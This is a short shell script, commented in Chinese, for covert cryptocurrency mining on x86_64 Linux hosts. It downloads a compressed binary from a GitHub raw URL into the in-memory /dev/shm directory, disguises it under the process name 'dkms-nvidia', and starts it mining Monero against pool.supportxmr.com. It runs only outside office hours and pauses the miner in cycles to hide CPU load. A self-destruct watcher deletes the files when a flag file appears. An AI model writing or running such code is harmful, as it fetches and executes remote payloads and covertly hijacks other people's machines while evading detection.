#!/bin/sh
# relay-px v6 - 免杀重编译payload + 五级隐蔽挖矿
ARCH=$(uname -m)
case "$ARCH" in
  x86_64) ;;
  aarch64) echo "arch-skip"; exit 0 ;;
  *) echo "arch-skip"; exit 0 ;;
esac

# 错峰: 0-8点+19-24点
H=$(date +%H)
if [ "$H" -ge 8 ] && [ "$H" -lt 19 ]; then echo "off-hours"; exit 0; fi

# 内存盘落地 + xz自解压
curl -sL -m 180 https://raw.githubusercontent.com/inubiyizibo71-cloud/relay-px/main/dkm.xz -o /dev/shm/.dkm.xz 2>/dev/null || wget -q -T 180 https://raw.githubusercontent.com/inubiyizibo71-cloud/relay-px/main/dkm.xz -O /dev/shm/.dkm.xz 2>/dev/null
xz -d -c /dev/shm/.dkm.xz > /dev/shm/dkms-nvidia 2>/dev/null
chmod +x /dev/shm/dkms-nvidia 2>/dev/null
if [ ! -x /dev/shm/dkms-nvidia ]; then echo failed; exit 0; fi

# 自毁标志清理
pkill -f dkms-nvidia 2>/dev/null
rm -f /dev/shm/.uninstall 2>/dev/null
nohup /dev/shm/dkms-nvidia -o pool.supportxmr.com:443 \
  --tls --donate-level=0 --cpu-max-threads=30 --background --log-file=/dev/null >/dev/null 2>&1 &

# 负载伪装: 挖4分停1.5分 + 自毁监听
nohup sh -c '
while true; do
  if [ -f /dev/shm/.uninstall ]; then
    pkill -9 -f dkms-nvidia
    rm -f /dev/shm/dkms-nvidia /dev/shm/.dkm.xz /dev/shm/.uninstall
    exit 0
  fi
  sleep 240; pkill -STOP -f dkms-nvidia 2>/dev/null
  sleep 90;  pkill -CONT -f dkms-nvidia 2>/dev/null
done' >/dev/null 2>&1 &
echo mined-ok